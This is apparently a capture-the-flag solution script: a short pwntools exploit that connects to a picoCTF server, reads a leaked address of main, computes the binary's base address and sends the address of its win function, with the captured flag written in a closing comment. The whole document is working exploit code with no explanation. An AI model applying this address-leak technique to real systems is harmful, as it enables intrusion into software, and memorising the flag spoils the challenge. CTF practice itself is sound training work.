#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./vuln", checksec = False)

# con = process()
# gdb.attach(con, gdbscript = "start")
con = remote("rescued-float.picoctf.net", 56727)

con.recvuntil(b"Address of main: ")
main_addr = int(con.recvline().strip(b"\n"), 16)
log.success(hex(main_addr))

elf.address = main_addr - 0x133d
log.success(hex(elf.address))

con.sendline(hex(elf.sym['win']))

con.interactive()

# picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_ecb96bdd}
